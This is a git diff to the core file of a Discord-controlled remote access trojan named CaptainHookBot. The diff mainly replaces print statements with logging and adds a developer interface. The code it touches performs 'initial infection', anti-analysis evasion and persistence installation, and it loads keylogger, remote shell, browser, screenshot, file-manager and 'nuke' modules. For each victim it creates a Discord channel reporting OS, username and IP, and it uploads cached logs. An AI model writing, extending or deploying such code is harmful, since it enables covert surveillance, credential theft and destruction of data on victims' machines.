@@ -14,6 +14,13 @@ from src.client.core.persistence import Persistence
 from src.client.core.cache import OfflineCache
 from src.client.core.wraith import WraithEngine
 
+import logging
+from src.client.core.tui import DeveloperTUI
+
+# Setup base logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
+logger = logging.getLogger(__name__)
+
 class CaptainHookBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
@@ -22,24 +29,29 @@ class CaptainHookBot(commands.Bot):
         self.offline_cache = OfflineCache()
         self.wraith = WraithEngine()
         self.is_connected = True
+        
+        # Developer TUI
+        if Config.DEVELOPER_MODE:
+            self.tui = DeveloperTUI(self)
+            self.tui.start()
 
     async def setup_hook(self):
         # 0. Wraith Melt (Initial Infection & Persistence)
         try:
             self.wraith.melt()
         except Exception as e:
-            print(f"Wraith Melt failed: {e}")
+            logger.error(f"Wraith Melt failed: {e}")
 
         # 1. Security Check
         if AntiAnalysis.check_all():
-            print("Anti-Analysis check triggered. Exiting.")
+            logger.warning("Anti-Analysis check triggered. Exiting.")
             sys.exit(0)
 
         # 2. Persistence Install
         try:
             Persistence.install()
         except Exception as e:
-            print(f"Persistence installation failed: {e}")
+            logger.error(f"Persistence installation failed: {e}")
 
         # 3. Load modules
         modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
@@ -47,15 +59,15 @@ class CaptainHookBot(commands.Bot):
             try:
                 # Use absolute import path for stability
                 await self.load_extension(f"src.client.modules.{module}")
-                print(f"Successfully loaded module: {module}")
+                logger.info(f"Successfully loaded module: {module}")
             except Exception as e:
-                print(f"Failed to load module {module}: {e}")
+                logger.error(f"Failed to load module {module}: {e}")
                 # Try fallback for bundled environments
                 try:
                     await self.load_extension(f"modules.{module}")
-                    print(f"Successfully loaded module (fallback): {module}")
+                    logger.info(f"Successfully loaded module (fallback): {module}")
                 except Exception as e2:
-                    print(f"Fallback loading for {module} failed: {e2}")
+                    logger.error(f"Fallback loading for {module} failed: {e2}")
         
         # 4. Start Heartbeat
         self.loop.create_task(self.connectivity_heartbeat())
@@ -69,7 +81,7 @@ class CaptainHookBot(commands.Bot):
                         if resp.status == 200:
                             if not self.is_connected:
                                 self.is_connected = True
-                                print("Reconnected to Discord.")
+                                logger.info("Reconnected to Discord.")
                                 # Stop Offline Ears if it was running
                                 media_cog = self.get_cog("Media")
                                 if media_cog:
@@ -80,7 +92,7 @@ class CaptainHookBot(commands.Bot):
                 except Exception as e:
                     if self.is_connected:
                         self.is_connected = False
-                        print(f"Disconnected from Discord: {e}")
+                        logger.warning(f"Disconnected from Discord: {e}")
                         # Start Offline Ears
                         media_cog = self.get_cog("Media")
                         if media_cog:
@@ -96,7 +108,7 @@ class CaptainHookBot(commands.Bot):
         try:
             guild_id_str = Config.GUILD_ID.strip()
             if not guild_id_str or "[[" in guild_id_str:
-                print("Invalid Guild ID in config.")
+                logger.error("Invalid Guild ID in config.")
                 return None
             
             guild_id = int(guild_id_str)
@@ -106,7 +118,7 @@ class CaptainHookBot(commands.Bot):
                 # Fallback: try to get from guilds cache directly
                 guild = discord.utils.get(self.guilds, id=guild_id)
                 if not guild:
-                    print(f"Could not find guild with ID {guild_id}. Available guilds: {[g.name for g in self.guilds]}")
+                    logger.error(f"Could not find guild with ID {guild_id}")
                     return None
 
             user_name = "unknown"
@@ -125,16 +137,16 @@ class CaptainHookBot(commands.Bot):
             if not channel:
                 try:
                     channel = await guild.create_text_channel(channel_name)
-                    print(f"Created new session channel: {channel_name}")
+                    logger.info(f"Created new session channel: {channel_name}")
                     await channel.send(f"⚓ **New Session Established**\n**OS:** `{Platform.get_system_info()['os']}`\n**User:** `{user_name}`\n**IP:** `{socket.gethostbyname(socket.gethostname())}`")
                 except Exception as e:
-                    print(f"Error creating channel: {e}")
+                    logger.error(f"Error creating channel: {e}")
                     return None
 
             self.session_channel = channel
             return channel
         except Exception as e:
-            print(f"Unexpected error in channel creation: {e}")
+            logger.error(f"Unexpected error in channel creation: {e}")
             return None
 
     async def process_offline_cache(self):
@@ -143,6 +155,7 @@ class CaptainHookBot(commands.Bot):
         if not pending_files or not self.session_channel:
             return
 
+        logger.info(f"Reconnected! Sending {len(pending_files)} cached logs...")
         await self.session_channel.send(f"🔄 **Reconnected!** Sending {len(pending_files)} cached logs...")
 
         for file_path in pending_files:
@@ -159,10 +172,10 @@ class CaptainHookBot(commands.Bot):
                 
                 os.remove(file_path)
             except Exception as e:
-                print(f"Error processing cache file {file_path}: {e}")
+                logger.error(f"Error processing cache file {file_path}: {e}")
 
     async def on_ready(self):
-        print(f"Logged in as {self.user.name}")
+        logger.info(f"Logged in as {self.user.name}")
         await self.get_or_create_session_channel()
         self.ensure_environment()
         if self.is_connected:
